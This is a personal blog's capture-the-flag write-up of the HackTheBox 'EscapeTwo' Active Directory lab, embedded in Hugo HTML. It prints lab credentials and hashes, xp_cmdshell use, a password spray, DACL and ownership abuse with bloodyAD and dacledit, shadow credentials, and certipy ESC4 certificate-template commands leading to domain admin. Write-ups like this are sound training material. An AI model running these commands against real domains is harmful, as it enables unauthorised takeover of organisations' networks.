@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.5991d603939a6d188be342b278a4555db90f163903158c623d2c39fde3d82cb3.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Patrick Hammes - HackTheBox - EscapeTwo</title>
+<meta property="og:title" content=Patrick&#32;Hammes&#32;-&#32;HackTheBox&#32;-&#32;EscapeTwo />
+<meta name="twitter:title" content=Patrick&#32;Hammes&#32;-&#32;HackTheBox&#32;-&#32;EscapeTwo />
+<meta itemprop="name" content=Patrick&#32;Hammes&#32;-&#32;HackTheBox&#32;-&#32;EscapeTwo />
+<meta name="application-name" content=Patrick&#32;Hammes&#32;-&#32;HackTheBox&#32;-&#32;EscapeTwo />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+
+<base href="//localhost:1313/posts/escapetwo/" />
+<link rel="canonical" href="//localhost:1313/posts/escapetwo/" itemprop="url" />
+<meta name="url" content="//localhost:1313/posts/escapetwo/" />
+<meta name="twitter:url" content="//localhost:1313/posts/escapetwo/" />
+<meta property="og:url" content="//localhost:1313/posts/escapetwo/" />
+
+
+<meta property="og:updated_time" content="2025-05-22T00:00:00Z" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='//localhost:1313/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+
+  
+    <meta name="twitter:site" content="@hatrickkkkk" />
+    <meta name="twitter:creator" content="@hatrickkkkk" />
+
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.145.0">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="//localhost:1313/">
+                <img src="/images/pat.png" alt="brand image">
+            </a>
+        
+        
+            <a href="//localhost:1313/">
+                <h1>Patrick Hammes</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    Hacking stuff.
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/whoami/">Whoami</a>
+                    </li>
+                    
+                
+            
+            
+                
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/posts/">Posts</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="//localhost:1313/posts/escapetwo/">HackTheBox - EscapeTwo</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="//localhost:1313/posts/cicada/">HackTheBox - Cicada</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="//localhost:1313/posts/active/"></a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="//localhost:1313/posts/blackfield/"></a>
+                            </li>
+                        
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/patrick-hammes/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="X" href="https://x.com/hatrickkkkk">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.1em" height="1.1em" viewBox="0 0 512 472.799">
+            <path fill="currentColor" d="M403.229 0h78.506L310.219 196.04 512 462.799H354.002L230.261 301.007 88.669 462.799h-78.56l183.455-209.683L0 0h161.999l111.856 147.88L403.229 0zm-27.556 415.805h43.505L138.363 44.527h-46.68l283.99 371.278z"/>
+        </svg>
+    </a>
+
+
+
+
+
+    <a target="_blank" class="social" title="Discord" href="https://discord.com">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="Instagram" href="https://www.instagram.com/hatrickkkk/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9S287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7s74.7 33.5 74.7 74.7s-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8c-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8s26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9c-26.2-26.2-58-34.4-93.9-36.2c-37-2.1-147.9-2.1-184.9 0c-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9c1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0c35.9-1.7 67.7-9.9 93.9-36.2c26.2-26.2 34.4-58 36.2-93.9c2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6c-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6c-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6c29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6c11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2025 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/escapetwo/">HackTheBox - EscapeTwo</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-05-22T00:00:00Z" class="post-date">
+        May 22, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>3 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-active directory">
+        <a href="//localhost:1313/tags/active-directory">active directory</a>
+      </li>
+      
+      <li class="tag-hackthebox">
+        <a href="//localhost:1313/tags/hackthebox">hackthebox</a>
+      </li>
+      
+      <li class="tag-windows">
+        <a href="//localhost:1313/tags/windows">windows</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+  <p class="seriesname">
+    Series: <a href="//localhost:1313/series/htb-machines">HTB Machines</a>
+  </p>
+  
+
+  
+</div>
+
+  <h1 id="escapetwo-walkthrough">EscapeTwo Walkthrough</h1>
+<p>In the machine description, we have credentials to start the machine, <code>rose</code> and <code>KxEPkKe6R8su</code>.</p>
+<hr>
+<h2 id="1-enumeration">1. Enumeration</h2>
+<h3 id="11-nmap">1.1 NMAP</h3>
+<p>As usual, let’s start by checking the open ports on the machine</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -T4 10.10.11.51 -Pn -oA nmap-out
+</span></span></code></pre></div><p><strong>Key findings:</strong></p>
+<p><img src="/images/escapetwo-nmap.png" alt="nmap"></p>
+<h3 id="12--smb-shares">1.2  SMB Shares</h3>
+<p>Enumerating SMB with smbclient and <code>rose</code> credentials:</p>
+<p><img src="/images/escapetwo-smb.png" alt="smb enum"></p>
+<blockquote>
+<p><strong>Finding:</strong> <code>Users</code> and <code>Accounting Department</code> shares.</p></blockquote>
+<p>By checking the <code>Accounting Department</code> share, we can see two <code>.xlsx</code> files. Let’s download them and check their content.</p>
+<p><img src="/images/escapetwo-smb1.png" alt="smb enum"></p>
+<p>Inside <code>accounts.xlsx -&gt; xl -&gt; sharedStrings.xml</code> we can find some credentials. Let’s take note of them and move on
+<img src="/images/escapetwo-sharedStrings.png" alt="sharedStrings">
+<img src="/images/escapetwo-creds.png" alt="creds"></p>
+<blockquote>
+<p>Finding 1: <code>angela / 0fwz7Q4mSpurIt99</code></p></blockquote>
+<blockquote>
+<p>Finding 2: <code>oscar / 86LxLBMgEWaKUnBG</code></p></blockquote>
+<blockquote>
+<p>Finding 3: <code>kevin / Md9Wlq1E5bZnVDVo</code></p></blockquote>
+<blockquote>
+<p>Finding 4: <code>sa / MSSQLP@ssw0rd!</code></p></blockquote>
+<p>In general, <code>sa</code> is the common admin user for MSSQL databases. Let’s try to explore this first using Impacket’s mssqlclient script.</p>
+<h3 id="13-mssql-service">1.3 MSSQL Service</h3>
+<p><img src="/images/escapetwo-mssql.png" alt="mssql"></p>
+<blockquote>
+<p>Great, now we are db admin.</p></blockquote>
+<p>By default, xp_cmdshell is disabled in MSSQL, let&rsquo;s enable it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>enable_xp_cmdshell
+</span></span></code></pre></div><p><img src="/images/escapetwo-enablecmd.png" alt="enable cmdshell"></p>
+<p>To obtain more data, we can check default files from MSSQL deployment:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exec xp_cmdshell <span style="color:#e6db74">&#39;type \SQL2019\ExpressAdv_ENU\sql-Configuration.INI&#39;</span>
+</span></span></code></pre></div><p><img src="/images/escapetwo-newcreds.png" alt="new creds"></p>
+<blockquote>
+<p><strong>Finding:</strong> New credential, <code>SEQUEL\sql_svc / WqSZAF6CysDQbGb3</code></p></blockquote>
+<hr>
+<h2 id="2-shell-as-sql_svc">2. Shell as sql_svc</h2>
+<p>Since we can execute commands with the SQL service, we can try a PowerShell reverse shell. We can generate it using <a href="https://www.revshells.com/" target="_blank">RevShell Generator</a>.</p>
+<h3 id="21-powershell-payload---base64-encoded">2.1 Powershell Payload - Base64 encoded</h3>
+<p><img src="/images/escapetwo-revshell.png" alt="revshell"></p>
+<h3 id="22-receiving-connection">2.2 Receiving connection</h3>
+<p><img src="/images/escapetwo-revshell1.png" alt="revshell1"></p>
+<blockquote>
+<p><strong>Now we are inside the box!</strong></p></blockquote>
+<hr>
+<h2 id="3-lateral-movement">3. Lateral Movement</h2>
+<p>Looking for some users at <code>C:/Users/</code> that have logged into the machine we can see just <code>ryan</code> as a possible next goal. Let&rsquo;s try a password spray with all the credentials that we&rsquo;ve got.</p>
+<h3 id="31-password-spray">3.1 Password spray</h3>
+<p>Putting all the previous password on a file called passwords.txt, let&rsquo;s start the attack with netexec.</p>
+<p><img src="/images/escapeTwo-passwordSpray.png" alt="password spray"></p>
+<blockquote>
+<p><strong>Finding:</strong> New valid credential for <code>ryan</code> user.</p></blockquote>
+<h3 id="31-evil-winrm-with-ryan">3.1 Evil-winrm with <code>ryan</code></h3>
+<p>Let&rsquo;s try a shell with <code>ryan</code> user.</p>
+<p><img src="/images/escapetwo-ryanshell.png" alt="shell as ryan"></p>
+<blockquote>
+<p><strong>Great, we succesfull did a lateral movement!</strong></p></blockquote>
+<hr>
+<h2 id="4-privillege-escalation">4. Privillege Escalation</h2>
+<h3 id="41-bloodhound">4.1 BloodHound</h3>
+<p>Let&rsquo;s get some information with Bloodhound and analyse it.</p>
+<pre tabindex="0"><code></code></pre><p><img src="/images/escapetwo-bloodhound.png" alt="bloodhound"></p>
+<h3 id="42-writeowner-abuse">4.2 WriteOwner Abuse</h3>
+<p>By analysing the results, we can se that use <code>ryan</code> has <code>WriteOwner</code> rights on <code>ca_svc</code> object, this can result in a full control of that object. Let&rsquo;s explore this.</p>
+<p><img src="/images/escapetwo-abuseOwner.png" alt="abuse writeowner"></p>
+<p>Grant ourselves ownership of the object in AD:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodyAD --host <span style="color:#e6db74">&#39;10.10.11.51&#39;</span> -d <span style="color:#e6db74">&#39;sequel.htb&#39;</span> -u <span style="color:#e6db74">&#39;ryan&#39;</span> -p <span style="color:#e6db74">&#39;WqSZAF6CysDQbGb3&#39;</span> set owner <span style="color:#e6db74">&#39;ca_svc&#39;</span> <span style="color:#e6db74">&#39;ryan&#39;</span>
+</span></span></code></pre></div><p>Give ourselves FullControl over the ca_svc user, allowing us to add a shadow credential on next step:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-dacledit -action <span style="color:#e6db74">&#39;write&#39;</span> -rights <span style="color:#e6db74">&#39;FullControl&#39;</span> -principal <span style="color:#e6db74">&#39;ryan&#39;</span> -target <span style="color:#e6db74">&#39;ca_svc&#39;</span> <span style="color:#e6db74">&#39;10.10.11.51&#39;</span>/<span style="color:#e6db74">&#34;ryan&#34;</span>:<span style="color:#e6db74">&#34;WqSZAF6CysDQbGb3&#34;</span>
+</span></span></code></pre></div><p><img src="/images/escapetwo-abuseOwner1.png" alt="abuse owner"></p>
+<p>Now we can add a shadow credential:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account <span style="color:#e6db74">&#39;ca_svc&#39;</span> -dc-ip 10.10.11.51  
+</span></span></code></pre></div><p><img src="/images/escapetwo-shadowCreds.png" alt="shadow cred"></p>
+<h3 id="43-enumerating-adcs-vulnerabilities">4.3 Enumerating ADCS Vulnerabilities</h3>
+<p>We can use certipy-ad tool to enumerate possible vulnerabilities in ADCS.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad find -u <span style="color:#e6db74">&#39;ca_svc&#39;</span> -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip <span style="color:#e6db74">&#39;10.10.11.51&#39;</span> -vulnerable
+</span></span></code></pre></div><p><img src="/images/escapetwo-enum-adcs.png" alt="enum-adcs"></p>
+<blockquote>
+<p><strong>Vulnerable to ESC4!</strong></p></blockquote>
+<h3 id="44-esc4-abuse">4.4 ESC4 Abuse</h3>
+<p>ESC4 (ESCalation 4) refers to a privilege escalation path where an attacker abuses the ability to manage certificate templates in an ADCS environment. Specifically, the attacker has permissions like WriteOwner, WriteDacl, WriteProperty, or AllExtendedRights over a certificate template object.</p>
+<p>By modifying the template&rsquo;s settings, the attacker can make it vulnerable, then request a certificate to impersonate privileged users, such as Domain Admins or Enterprise Admins.</p>
+<p>Using <code>certipy-ad</code>to exploit it:</p>
+<p>We have to do this very quickly due to the error <em>CERTSRV_E_SUBJECT_DNS_REQUIRED - The Domain Name System (DNS) name is unavailable and cannot be added to the Subject Alternate name</em></p>
+<p>Cause ca_svc has full control over the template we&rsquo;ll make it vulnerable to ESC1 at first.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad template -u <span style="color:#e6db74">&#39;ca_svc&#39;</span> -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip <span style="color:#e6db74">&#39;10.10.11.51&#39;</span> -template <span style="color:#e6db74">&#39;DunderMifflinAuthentication&#39;</span> -write-default-configuration -no-save
+</span></span></code></pre></div><p><img src="/images/escapetwo-esc4-1.png" alt="esc4-pt1"></p>
+<p>Now, I can request for a domain administrator certificate using the modified template:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb
+</span></span></code></pre></div><p><img src="/images/escapetwo-esc4-2.png" alt="esc4-pt2"></p>
+<p>With the certificate, we can retrieve the NTLM hash for the account:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51
+</span></span></code></pre></div><p><img src="/images/escapetwo-esc4-3.png" alt="esc4-pt3"></p>
+<h3 id="45-shell-as-domain-admin">4.5 Shell as Domain Admin</h3>
+<p>Now, just evil-winrm with the new hash.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -u <span style="color:#e6db74">&#39;administrator&#39;</span> -H 7a8d4e04986afa8ed4060f75e5a0b3ff -i 10.10.11.51 
+</span></span></code></pre></div><p><img src="/images/escapetwo-domainadmin.png" alt="esc4-pt2"></p>
+
+  
+  <hr>
+<div class="footer">
+    
+    
+    
+    <p>
+    This is a post in the <b><a href="//localhost:1313/series/htb-machines">HTB Machines</a></b> series.
+        <br>Other posts in this series:
+        <ul class="series">
+            
+            
+            
+            <li>
+                May 22, 2025 -
+                
+                    HackTheBox - EscapeTwo
+                
+            </li>
+            
+            <li>
+                May 16, 2025 -
+                
+                    <a href="/posts/cicada/">HackTheBox - Cicada</a>
+                
+            </li>
+            
+        </ul>
+    </p>
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-enumeration">1. Enumeration</a>
+      <ul>
+        <li><a href="#11-nmap">1.1 NMAP</a></li>
+        <li><a href="#12--smb-shares">1.2  SMB Shares</a></li>
+        <li><a href="#13-mssql-service">1.3 MSSQL Service</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-shell-as-sql_svc">2. Shell as sql_svc</a>
+      <ul>
+        <li><a href="#21-powershell-payload---base64-encoded">2.1 Powershell Payload - Base64 encoded</a></li>
+        <li><a href="#22-receiving-connection">2.2 Receiving connection</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-lateral-movement">3. Lateral Movement</a>
+      <ul>
+        <li><a href="#31-password-spray">3.1 Password spray</a></li>
+        <li><a href="#31-evil-winrm-with-ryan">3.1 Evil-winrm with <code>ryan</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#4-privillege-escalation">4. Privillege Escalation</a>
+      <ul>
+        <li><a href="#41-bloodhound">4.1 BloodHound</a></li>
+        <li><a href="#42-writeowner-abuse">4.2 WriteOwner Abuse</a></li>
+        <li><a href="#43-enumerating-adcs-vulnerabilities">4.3 Enumerating ADCS Vulnerabilities</a></li>
+        <li><a href="#44-esc4-abuse">4.4 ESC4 Abuse</a></li>
+        <li><a href="#45-shell-as-domain-admin">4.5 Shell as Domain Admin</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
